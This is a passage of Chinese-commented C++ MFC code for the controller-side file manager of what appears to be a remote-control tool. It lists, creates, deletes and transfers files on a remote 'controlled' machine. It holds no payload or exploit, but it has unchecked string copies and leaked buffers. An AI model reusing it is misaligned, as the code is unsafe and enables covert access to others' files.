{
	// 重新设置ImageList
	//  SHFILEINFO	sfi;
	//  HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	//	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	//	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	//	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);  //??

	// 重建标题
	m_CListCtrl_Dialog_File_Manager_Client.DeleteAllItems();
	while (m_CListCtrl_Dialog_File_Manager_Client.DeleteColumn(0) != 0);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(0, "名称", LVCFMT_LEFT, 200);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);
	int	v10 = 0;
	m_CListCtrl_Dialog_File_Manager_Client.SetItemData(m_CListCtrl_Dialog_File_Manager_Client.InsertItem(v10++,
		"..", GetServerIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)), 1);
	if (BufferLength != 0)
	{
		// 遍历发送来的数据显示到列表中
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token   	//[Flag 1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			char *Travel = (char *)(BufferData + 1);
			//[1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			for (char *v1 = Travel; Travel - v1 < BufferLength - 1;)
			{
				char	*FileName = NULL;
				DWORD	FileSizeHigh = 0; // 文件高字节大小
				DWORD	FileSizeLow = 0;  // 文件低字节大小
				int		iItem = 0;
				bool	bIsInsert = false;
				FILETIME FileTime;

				int	v3 = *Travel ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(v3 == FILE_ATTRIBUTE_DIRECTORY) == i;

				//0==1     0==0   !1  0

				////[HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
				FileName = ++Travel;

				if (bIsInsert)
				{
					iItem = m_CListCtrl_Dialog_File_Manager_Client.InsertItem(v10++, FileName, GetServerIconIndex(FileName, v3));
					m_CListCtrl_Dialog_File_Manager_Client.SetItemData(iItem, v3 == FILE_ATTRIBUTE_DIRECTORY);   //隐藏属性
					SHFILEINFO	sfi;
					SHGetFileInfo(FileName, FILE_ATTRIBUTE_NORMAL | v3, &sfi, sizeof(SHFILEINFO),
						SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
					m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 2, sfi.szTypeName);
				}
				// 得到文件大小
				Travel += strlen(FileName) + 1;
				if (bIsInsert)
				{
					memcpy(&FileSizeHigh, Travel, 4);
					memcpy(&FileSizeLow, Travel + 4, 4);
					CString v7;
					v7.Format("%10d KB", (FileSizeHigh * (MAXDWORD + 1)) / 1024 + FileSizeLow / 1024 + (FileSizeLow % 1024 ? 1 : 0));
					m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 1, v7);
					memcpy(&FileTime, Travel + 8, sizeof(FILETIME));
					CTime	Time(FileTime);
					m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 3, Time.Format("%Y-%m-%d %H:%M"));
				}
				Travel += 16;
			}
		}
	}
	// 恢复窗口

	m_CListCtrl_Dialog_File_Manager_Client.EnableWindow(TRUE);
}

//转到上一级目录
void CDlgFileManager::OnServerFilePrevious()
{
	FixedServerFileList("..");
}

void CDlgFileManager::OnClientFilePrevious()
{
	GetClientFilesList("..");
}
//删除文件
void CDlgFileManager::OnServerFileDelete()
{
	/*
	CString v1;
	if (m_CListCtrl_Dialog_File_Manager_Server.GetSelectedCount() > 1)
	{
		v1.Format("确定要将这 %d 项删除吗?", m_CListCtrl_Dialog_File_Manager_Server.GetSelectedCount());
	}
	else
	{
		int iItem = m_CListCtrl_Dialog_File_Manager_Server.GetSelectionMark();   //.. fff 1  Hello
		if (iItem == -1)
		{
			return;
		}
		CString FileName = m_CListCtrl_Dialog_File_Manager_Server.GetItemText(m_CListCtrl_Dialog_File_Manager_Server.GetSelectionMark(), 0);

		if (m_CListCtrl_Dialog_File_Manager_Server.GetItemData(iItem) == 1)
		{
			v1.Format("确实要删除文件夹“%s”并将所有内容删除吗?", FileName);
		}
		else
		{
			v1.Format("确实要把“%s”删除吗?", FileName);
		}
	}
	if (::MessageBox(m_hWnd, v1, "确认删除", MB_YESNO | MB_ICONQUESTION) == IDNO)
	{
		return;
	}
	//不能让用户乱点
	EnableControl(FALSE);

	POSITION Pos = m_CListCtrl_Dialog_File_Manager_Server.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int iItem = m_CListCtrl_Dialog_File_Manager_Server.GetNextSelectedItem(Pos);
		CString	FileFullPath = m_ServerFileFullPath + m_CListCtrl_Dialog_File_Manager_Server.GetItemText(iItem, 0);
		// 如果是目录
		if (m_CListCtrl_Dialog_File_Manager_Server.GetItemData(iItem))
		{
			FileFullPath += '\\';
			DeleteDirectory(FileFullPath);
		}
		else
		{
			DeleteFile(FileFullPath);
		}
	}
	// 禁用文件管理窗口
	EnableControl(TRUE);
	//刷新目录
	FixedServerFileList(".");*/
}

void CDlgFileManager::OnClientFileDelete()
{
	/*
	CString v1;
	if (m_CListCtrl_Dialog_File_Manager_Client.GetSelectedCount() > 1)
	{
		v1.Format("确定要将这 %d 项删除吗?", m_CListCtrl_Dialog_File_Manager_Client.GetSelectedCount());
	}
	else
	{
		int iItem = m_CListCtrl_Dialog_File_Manager_Client.GetSelectionMark();   
		if (iItem == -1)
		{
			return;
		}
		CString FileName = m_CListCtrl_Dialog_File_Manager_Client.GetItemText(m_CListCtrl_Dialog_File_Manager_Client.GetSelectionMark(), 0);

		if (m_CListCtrl_Dialog_File_Manager_Client.GetItemData(iItem) == 1)
		{
			v1.Format("确实要删除文件夹“%s”并将所有内容删除吗?", FileName);
		}
		else
		{
			v1.Format("确实要把“%s”删除吗?", FileName);
		}
	}
	if (::MessageBox(m_hWnd, v1, "确认删除", MB_YESNO | MB_ICONQUESTION) == IDNO)
	{
		return;
	}
	//不能让用户乱点
	EnableControl(FALSE);

	POSITION Pos = m_CListCtrl_Dialog_File_Manager_Client.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int iItem = m_CListCtrl_Dialog_File_Manager_Client.GetNextSelectedItem(Pos);
		CString	FileFullPath = m_ClientFileFullPath + m_CListCtrl_Dialog_File_Manager_Client.GetItemText(iItem, 0);
		// 如果是目录
		if (m_CListCtrl_Dialog_File_Manager_Client.GetItemData(iItem))
		{
			FileFullPath += '\\';

			ULONG	BufferLength = FileFullPath.GetLength() + 2;
			BYTE*   BufferData = (BYTE *)new BYTE[BufferLength];
			BufferData[0] = CLIENT_FILE_MANAGER_DELETE_FLODER;
			memcpy(BufferData + 1, FileFullPath.GetBuffer(0), BufferLength - 1);
			m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
			delete[] BufferData;
			BufferData = NULL;
		}
		else
		{
			ULONG	BufferLength = FileFullPath.GetLength() + 2;
			BYTE*   BufferData = (BYTE *)new BYTE[BufferLength];
			BufferData[0] = CLIENT_FILE_MANAGER_DELETE_FILE;
			memcpy(BufferData + 1, FileFullPath.GetBuffer(0), BufferLength - 1);
			m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
			delete[] BufferData;
			BufferData = NULL;
		}
	}*/
	// 禁用文件管理窗口
}
//在主控端新建文件夹
void CDlgFileManager::OnServerFileNewFolder()
{
	if (m_ServerFileFullPath == "")
		return;


	CDlgFileNewFolder Dlg(this);
	if (Dlg.DoModal() == IDOK && Dlg.m_CEdit_New_Floder_Name.GetLength())
	{
		// 创建多层目录
		CString  v1;
		v1 = m_ServerFileFullPath + Dlg.m_CEdit_New_Floder_Name + "\\";
		MakeSureDirectoryPathExists(v1.GetBuffer());  /*c:\Hello\  */
		FixedServerFileList(".");
	}

}
//在客户端新建文件夹
void CDlgFileManager::OnClientFileNewFolder()
{
	if (m_ClientFileFullPath == "")
	{
		return;
	}
	CDlgFileNewFolder Dlg(this);
	if (Dlg.DoModal() == IDOK && Dlg.m_CEdit_New_Floder_Name.GetLength())
	{
		// 创建多层目录
		CString  v1;
		v1 = m_ClientFileFullPath + Dlg.m_CEdit_New_Floder_Name + "\\";
		ULONG	BufferLength = v1.GetLength() + 2;
		BYTE*   BufferData = (BYTE *)new BYTE[BufferLength];
		BufferData[0] = CLIENT_FILE_MANAGER_NEW_FLODER;
		memcpy(BufferData + 1, v1.GetBuffer(0), BufferLength - 1);
		m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
		delete[] BufferData;
		BufferData = NULL;
	}
}

void CDlgFileManager::OnServerFileStop()
{

}

void CDlgFileManager::OnServerViewFileSmall()
{

}

void CDlgFileManager::OnServerViewFileList()
{

}

void CDlgFileManager::OnServerViewFileDetail()
{

}

//禁止用户在工作区工作
void CDlgFileManager::EnableControl(BOOL bEnable)
{
	m_CListCtrl_Dialog_File_Manager_Server.EnableWindow(bEnable);
	m_CCombo_Dialog_File_Manager_Server_File.EnableWindow(bEnable);
	m_CListCtrl_Dialog_File_Manager_Client.EnableWindow(bEnable);
	m_CCombo_Dialog_File_Manager_Client_File.EnableWindow(bEnable);
}

BOOL CDlgFileManager::DeleteDirectory(LPCTSTR DirectoryFullPath)
{
	WIN32_FIND_DATA	wfd;
	char	BufferData[MAX_PATH] = { 0 };

	wsprintf(BufferData, "%s\\*.*", DirectoryFullPath);

	HANDLE FileHandle = FindFirstFile(BufferData, &wfd);
	if (FileHandle == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (wfd.cFileName[0] == '.'&&strlen(wfd.cFileName)<=2)
		{
			continue;
		}
		else 
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char v1[MAX_PATH];
				wsprintf(v1, "%s\\%s", DirectoryFullPath, wfd.cFileName);
				DeleteDirectory(v1);
			}
			else
			{
				char v1[MAX_PATH];
				wsprintf(v1, "%s\\%s", DirectoryFullPath, wfd.cFileName);
				DeleteFile(v1);
			}
		}
	} while (FindNextFile(FileHandle, &wfd));

	FindClose(FileHandle); // 关闭查找句柄

	if (!RemoveDirectory(DirectoryFullPath))
	{
		return FALSE;
	}
	return TRUE;
}
//创建深层路径文件夹
BOOL CDlgFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath)
{
	char* Travel = NULL;
	char* BufferData = NULL;
	DWORD DirectoryAttributes;
	__try
	{
		BufferData = (char*)malloc(sizeof(char)*(strlen(DirectoryFullPath) + 1));
		if (BufferData == NULL)
		{
			return FALSE;
		}
		strcpy(BufferData, DirectoryFullPath);
		Travel = BufferData;
		if (*(Travel + 1) == ':')
		{
			Travel++;
			Travel++;
			if (*Travel && (*Travel == '\\'))
			{
				Travel++;
			}
		}
		//深层目录
		while (*Travel)           //D:\Hello\\World\Shit\0
		{
			if (*Travel == '\\')
			{
				*Travel = '\0';
				DirectoryAttributes = GetFileAttributes(BufferData);   //查看是否是否目录  目录存在吗
				if (DirectoryAttributes == 0xffffffff)
				{
					if (!CreateDirectory(BufferData, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(BufferData);
							return FALSE;
						}
					}
				}
				else
				{
					if ((DirectoryAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(BufferData);
						BufferData = NULL;
						return FALSE;
					}
				}

				*Travel = '\\';
			}

			Travel = CharNext(Travel);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (BufferData != NULL)
		{
			free(BufferData);
			BufferData = NULL;
		}
		return FALSE;
	}
	if (BufferData != NULL)
	{
		free(BufferData);
		BufferData = NULL;
	}
	return TRUE;
}
//服务器到客户端的文件传送
void CDlgFileManager::OnLvnBegindragListDialogFileManagerServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	if (m_ServerFileFullPath.IsEmpty() || m_ClientFileFullPath.IsEmpty())
	{
		return;
	}

	//	m_ulDragIndex = pNMLV->iItem;   //保存要拖的项

	if (m_CListCtrl_Dialog_File_Manager_Server.GetSelectedCount() > 1) //变换鼠标的样式 如果选择多项进行拖拽
	{
		//选择多项鼠标的样子
		m_CursorHwnd = AfxGetApp()->LoadCursor(IDC_CURSOR_MULITI_MDRAG);
	}
	else
	{
		//选择单项鼠标的样子
		m_CursorHwnd = AfxGetApp()->LoadCursor(IDC_CURSOR_SINGLE_SDRAG);
	}

	m_IsDragging = TRUE;
	m_DragControlList = &m_CListCtrl_Dialog_File_Manager_Server;
	m_DropControlList = &m_CListCtrl_Dialog_File_Manager_Server;

	SetCapture();


	*pResult = 0;
}

void CDlgFileManager::OnMouseMove(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_IsDragging)    //我们只对拖拽感兴趣
	{
		CPoint Point(point);	 //获得鼠标位置
		ClientToScreen(&Point);  //转成相对于自己屏幕的
	
								 //根据鼠标获得窗口句柄
		CWnd* v1 = WindowFromPoint(Point);   //值所在位置 有没有控件

		if (v1->IsKindOf(RUNTIME_CLASS(CListCtrl)))   //属于我们的窗口范围内
		{
			//改变鼠标样式
			SetCursor(m_CursorHwnd);
			return;
		}
		else
		{
			SetCursor(LoadCursor(NULL, IDC_NO));   //超出窗口换鼠标样式
		}
	}
	CDialog::OnMouseMove(nFlags, point);
}

void CDlgFileManager::OnLButtonUp(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_IsDragging)
	{
		ReleaseCapture();  //释放鼠标的捕获

		m_IsDragging = FALSE;

		CPoint Point(point);    //获得当前鼠标的位置相对于整个屏幕的
		ClientToScreen(&Point); //转换成相对于当前用户的窗口的位置

		CWnd* v1 = WindowFromPoint(Point);   //获得当前的鼠标下方有无控件


		if (v1->IsKindOf(RUNTIME_CLASS(CListCtrl))) //如果是一个ListControl
		{
			m_DropControlList = (CListCtrl*)v1;       //保存当前的窗口句柄
			DropItemDataOnList(); //处理传输
		}
	}
	CDialog::OnLButtonUp(nFlags, point);
}
//
VOID CDlgFileManager::DropItemDataOnList()
{
	if (m_DragControlList == m_DropControlList)
	{
		return;
	}
	//从客户端发送文件到服务器
	if ((CWnd *)m_DropControlList == &m_CListCtrl_Dialog_File_Manager_Server)       //客户端向主控端
	{
		OnCopyClientDataToServer();
	}
	//从服务器发送文件到客户端
	else if ((CWnd *)m_DropControlList == &m_CListCtrl_Dialog_File_Manager_Client)  //主控端向客户端
	{
		OnCopyServerFileToClient();
	}
	else
	{
		return;
	}
	
}
//从主控端到被控端拷贝文件
VOID CDlgFileManager::OnCopyServerFileToClient() 
{
	//定义一个模板  （模板数据结构）
	m_ServerFileToClientJob.RemoveAll();
	POSITION Position = m_CListCtrl_Dialog_File_Manager_Server.GetFirstSelectedItemPosition();
	while (Position)
	{
		int iItem = m_CListCtrl_Dialog_File_Manager_Server.GetNextSelectedItem(Position);
		CString	FileFullPath = NULL;

		FileFullPath = m_ServerFileFullPath + m_CListCtrl_Dialog_File_Manager_Server.GetItemText(iItem, 0);

		// 如果是目录
		if (m_CListCtrl_Dialog_File_Manager_Server.GetItemData(iItem))
		{
			FileFullPath += '\\';
			FixedServerFileToClientDirectory(FileFullPath.GetBuffer(0));
		}
		else
		{
			// 判断打开文件是否合法(添加到上传任务列表中去)
			HANDLE FileHanlde = CreateFile(FileFullPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (FileHanlde == INVALID_HANDLE_VALUE)
			{
				continue;
			}
			m_ServerFileToClientJob.AddTail(FileFullPath);
			CloseHandle(FileHanlde);
		}
	}
	if (m_ServerFileToClientJob.IsEmpty())
	{
		//如果选择有空目录是不处理的
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK | MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendServerFileInfoToClient(); //发送第一个任务
}

//遍历目录中的数据
BOOL CDlgFileManager::FixedServerFileToClientDirectory(LPCTSTR DircetoryFullPath)
{
	CHAR	BufferData[MAX_PATH];
	CHAR	*Slash = NULL;
	memset(BufferData, 0, sizeof(BufferData));
	if (DircetoryFullPath[strlen(DircetoryFullPath) - 1] != '\\')
	{
		Slash = "\\";
	}
	else 
	{
		Slash = "";
	}
	sprintf(BufferData, "%s%s*.*", DircetoryFullPath, Slash);   
	//D:\Hello\*.*
	//[HelloWorld]1.txt[World]2.txt

	WIN32_FIND_DATA	wfd;
	HANDLE FileHandle = FindFirstFile(BufferData, &wfd);   //C;|1\*.*
	if (FileHandle == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
	{
		return FALSE;
	}
	do
	{
		// 过滤这两个目录 '.'和'..'
		if (wfd.cFileName[0] == '.')
		{ 
			continue; 
		}
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			CHAR v1[MAX_PATH];
			sprintf(v1, "%s%s%s", DircetoryFullPath, Slash, wfd.cFileName);
			FixedServerFileToClientDirectory(v1); // 如果找到的是目录，则进入此目录进行递归 
		}
		else
		{
			CString FileFullPath;
			FileFullPath.Format("%s%s%s", DircetoryFullPath, Slash, wfd.cFileName);
			m_ServerFileToClientJob.AddTail(FileFullPath);
			// 对文件进行操作 
		}
	} while (FindNextFile(FileHandle, &wfd));
	FindClose(FileHandle); // 关闭查找句柄
	return true;
}
//发送文件到客户端
BOOL CDlgFileManager::SendServerFileInfoToClient() //从主控端到被控端的发送任务
{
	if (m_ServerFileToClientJob.IsEmpty())
	{
		return FALSE;
	}
	CString	strDestDirectory = m_ClientFileFullPath;  //确认目标路径(取出目标的父目录)
	m_SourceFileFullPath = m_ServerFileToClientJob.GetHead();  //获得第一个任务的名称   

	DWORD	FileLengthHigh;
	DWORD	FileLengthlow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	FileHandle;
	CString	v1 = m_SourceFileFullPath;//远程文件路径          
	
	//得到要保存到的远程的文件路径
	//置换路径
	v1.Replace(m_ServerFileFullPath, m_ClientFileFullPath);  //D:1.txt     E:1.txt
	m_DestinationFileFullPath = v1;  //修正好的名字
	//打开本地文件
	FileHandle = CreateFile(m_SourceFileFullPath.GetBuffer(0), 
		GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);   
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	//获得要发送文件的大小
	FileLengthlow = GetFileSize(FileHandle, &FileLengthHigh);
	//操作文件大小  （不支持文件传送）
	//大文件传送（作业）
	m_OperatingFileLength = (FileLengthHigh * (MAXDWORD + 1)) + FileLengthlow;
	CloseHandle(FileHandle);
	// 构造数据包，发送文件长度

	ULONG BufferLength = v1.GetLength() + 10;
	BYTE*  BufferData = (BYTE*)LocalAlloc(LPTR, BufferLength);
	memset(BufferData, 0, BufferLength);

	BufferData[0] = CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION;

	//[Flag 0001 0001 E:\1.txt\0 ]

	//向被控端发送消息 COMMAND_FILE_SIZE 被控端会执行CreateLocalRecvFile函数从而分成两中情况一种是要发送文件已经存在就会接收到 TOKEN_GET_TRANSFER_MODE 
	//另一种是被控端调用GetFileData函数从而接收到TOKEN_DATA_CONTINUE

	memcpy(BufferData + 1, &FileLengthHigh, sizeof(DWORD));
	memcpy(BufferData + 5, &FileLengthlow, sizeof(DWORD));

	memcpy(BufferData + 9, v1.GetBuffer(0), v1.GetLength() + 1);

	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);

	LocalFree(BufferData);

	// 从下载任务列表中删除自己
	m_ServerFileToClientJob.RemoveHead();
	return TRUE;
}
//遇到相同的文件的操作
VOID CDlgFileManager::SendTransferMode()		//如果主控端发送的文件在被控端上存在提示如何处理  
{
	CDlgFileMode	Dlg(this);
	Dlg.m_FileFullPath = m_DestinationFileFullPath;
	switch (Dlg.DoModal())
	{
	case IDC_BUTTON_TRANSFER_MODE_OVERWRITE:
		m_TransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_BUTTON_TRANSFER_MODE_OVERWRITE_ALL:
		m_TransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_BUTTON_TRANSFER_MODE_JUMP:
		m_TransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_BUTTON_TRANSFER_MODE_JUMP_ALL:
		m_TransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDCANCEL:
		m_TransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_TransferMode == TRANSFER_MODE_CANCEL)
	{
		m_IsStop = TRUE;
		EndCopyServerToClient();
		return;
	}
	BYTE IsToken[5];
	IsToken[0] = CLIENT_FILE_MANAGER_SET_TRANSFER_MODE;
	memcpy(IsToken + 1, &m_TransferMode, sizeof(m_TransferMode));
	m_IOCPServer->OnPrepareSending(m_ContextObject, (unsigned char *)&IsToken, sizeof(IsToken));
}
//拷贝完了，恢复操作
VOID CDlgFileManager::EndCopyServerToClient()	//如果有任务就继续发送没有就恢复界面	                       
{
	m_Counter = 0;
	m_OperatingFileLength = 0;
	ShowProgress();
	if (m_ServerFileToClientJob.IsEmpty() || m_IsStop)
	{
		m_ServerFileToClientJob.RemoveAll();
		m_IsStop = FALSE;
		EnableControl(TRUE); //用户可以点了
		m_TransferMode = TRANSFER_MODE_NORMAL;
		GetClientFilesList(".");
	}
	else
	{
		Sleep(5);
		SendServerFileInfoToClient();
	}
	return;
}
//显示进度条
void CDlgFileManager::ShowProgress()
{
	//恢复进度条
	if ((int)m_Counter == -1)
	{
		m_Counter = m_OperatingFileLength;
	}

	int	iProgress = (float)(m_Counter * 100) / m_OperatingFileLength;
	m_ProgressCtrl->SetPos(iProgress);


	if (m_Counter == m_OperatingFileLength)
	{
		m_Counter = m_OperatingFileLength = 0;
	}
}

VOID CDlgFileManager::SendServerFileDataToClient()
{
	FILE_SIZE* v1 = (FILE_SIZE *)(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));
	LONG	OffsetHigh = v1->FileSizeHigh;    //0
	LONG	OffsetLow = v1->FileSizeLow;      //0

	m_Counter = MAKEINT64(v1->FileSizeLow, v1->FileSizeHigh);   //0

	ShowProgress(); //通知进度条
    //pFileSize->dwSizeLow == -1  是对方选择了跳过    m_nCounter == m_nOperatingFileLength  完成当前的传输
	if (m_Counter == m_OperatingFileLength || m_IsStop || v1->FileSizeLow == -1)     
	{
		EndCopyServerToClient(); //进行下个任务的传送如果存在
		return;
	}

	HANDLE	FileHandle;
	FileHandle = CreateFile(m_SourceFileFullPath.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}

	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);   //8192    4G  300  设置文件大小

	int		v3 = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	DWORD	NumberOfBytesToRead = MAX_SEND_BUFFER - v3;
	DWORD	NumberOfBytesRead = 0;
	BYTE	*BufferData = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	if (BufferData == NULL)
	{
		CloseHandle(FileHandle);
		return;
	}
	BufferData[0] = CLIENT_FILE_MANAGER_FILE_DATA;
	memcpy(BufferData + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(BufferData + 5, &OffsetLow, sizeof(OffsetLow));	  //flag  0000 00 40 20     20    
	ReadFile(FileHandle, BufferData + v3, NumberOfBytesToRead, &NumberOfBytesRead, NULL);
	CloseHandle(FileHandle);

	if (NumberOfBytesRead > 0)
	{
		ULONG	BufferLength = NumberOfBytesRead + v3;
		m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
	}
	LocalFree(BufferData);
}

//从被控端到主控端拷贝文件
VOID CDlgFileManager::OnCopyClientDataToServer()
{
	//清空一下人物列表
	m_ClientFileToServerJob.RemoveAll();


	POSITION Pos = m_CListCtrl_Dialog_File_Manager_Client.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int iItem = m_CListCtrl_Dialog_File_Manager_Client.GetNextSelectedItem(Pos);

		CString	FileFullPath = NULL;

		FileFullPath = m_ClientFileFullPath + m_CListCtrl_Dialog_File_Manager_Client.GetItemText(iItem, 0);

		// 如果是文件夹
		if (m_CListCtrl_Dialog_File_Manager_Client.GetItemData(iItem))
		{
			FileFullPath += '\\';
			//将文件夹路径发送到客户端 让客户端枚举文件路径 返回到服务器
			char* BufferData = new char[FileFullPath.GetLength() + 1];
			BufferData[0] = CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH;
			memcpy(BufferData + 1, FileFullPath.GetBuffer(0), FileFullPath.GetLength());
			m_IOCPServer->OnPrepareSending(m_ContextObject, (PBYTE)BufferData, FileFullPath.GetLength() + 1);
		}
		else
		{
			//单个文件添加到任务列表添加
			m_ClientFileToServerJob.AddTail(FileFullPath);
			//禁用当前窗口 窗口控件变灰
			EnableControl(FALSE);
			//转换第一个文件路径 
			ClientToServerFileFullPath();
		}

	}

}

VOID CDlgFileManager::ClientToServerFileFullPath()
{
	//判断任务列表是否为空
	if (m_ClientFileToServerJob.IsEmpty())
		return;

	//需要将文件拷贝到该路径下
	// 例如 E:\  路径
	CString	strDestDirectory = m_ServerFileFullPath;

	//获得第一个拷贝文件绝对路径
	m_SourceFileFullPath = m_ClientFileToServerJob.GetHead();
	//例如  E:\新建文件夹\作业.txt   路径


	//将客户端的文件绝对路径发送给客户端 E:\新建文件夹\作业.txt
	PBYTE BufferData = new BYTE[m_SourceFileFullPath.GetLength() + 1];
	BufferData[0] = CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT;
	memcpy(BufferData + 1, m_SourceFileFullPath.GetBuffer(0), m_SourceFileFullPath.GetLength());
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, m_SourceFileFullPath.GetLength() + 1);

	DWORD	SizeHigh;
	DWORD	SizeLow;

	HANDLE	FileHandle;
	CString	v1 = m_SourceFileFullPath;
	//例如 v1 =  E:\新建文件夹\作业.txt    路径

	//将 v1 中的 m_ServerFileFullPath字符串 替换成 m_ClientFileFullPath字符串
	//例如  E:\新建文件夹\作业.txt 中的  E:\新建文件夹\ 替换成 E:\ 
	v1.Replace(m_ClientFileFullPath, m_ServerFileFullPath);

	//拷贝的目标文件最终的绝对路径为 E:\作业.txt
	m_DestinationFileFullPath = v1;

	memset(m_LocalFileFullPath, 0, MAX_PATH);
	memcpy(m_LocalFileFullPath, m_DestinationFileFullPath.GetBuffer(0), m_DestinationFileFullPath.GetLength());

	// 创建多层目录
	MakeSureDirectoryPathExists(m_LocalFileFullPath);

	//给定文件绝对路径 FindFirstFile能从文件父目录里面查找文件是否存在

	WIN32_FIND_DATA wfa;
	FileHandle = FindFirstFile(m_LocalFileFullPath, &wfa);

	//m_TransferMode不是全部覆盖和全部替换 并找到同名文件
	if (FileHandle != INVALID_HANDLE_VALUE
		&& m_TransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_TransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//如果该路径下有相同名称的文件
		LocalTransferMode();
	}
	else
	{
		//从客户端获得文件数据
		GetFileDataFromClient();
	}

	FindClose(FileHandle);
	// 从任务列表中删除
	m_ClientFileToServerJob.RemoveHead();
}
//如果服务器本地存在同名文件 提示如何处理  
VOID CDlgFileManager::LocalTransferMode()
{
	CDlgFileMode Dlg(this);

	Dlg.m_FileFullPath = m_DestinationFileFullPath;

	switch (Dlg.DoModal())
	{
	case IDC_BUTTON_TRANSFER_MODE_OVERWRITE:
		m_TransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_BUTTON_TRANSFER_MODE_OVERWRITE_ALL:
		m_TransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_BUTTON_TRANSFER_MODE_JUMP:
		m_TransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_BUTTON_TRANSFER_MODE_JUMP_ALL:
		m_TransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDCANCEL:
		m_TransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_TransferMode == TRANSFER_MODE_CANCEL)
	{
		m_IsStop = TRUE;
		EndCopyClientToServer();
		return;
	}
	//获得文件数据
	GetFileDataFromClient();
}
//判断 如果任务列表为空或者收到停止请求便停止    
VOID CDlgFileManager::EndCopyClientToServer()
{
	m_Counter = 0;

	m_OperatingFileLength = 0;

	//进度条
	ShowProgressClientToServer();

	//任务列表为空 或者收到停止请求
	if (m_ClientFileToServerJob.IsEmpty() || m_IsStop)
	{
		m_ClientFileToServerJob.RemoveAll();
		m_IsStop = FALSE;
		EnableControl(TRUE);

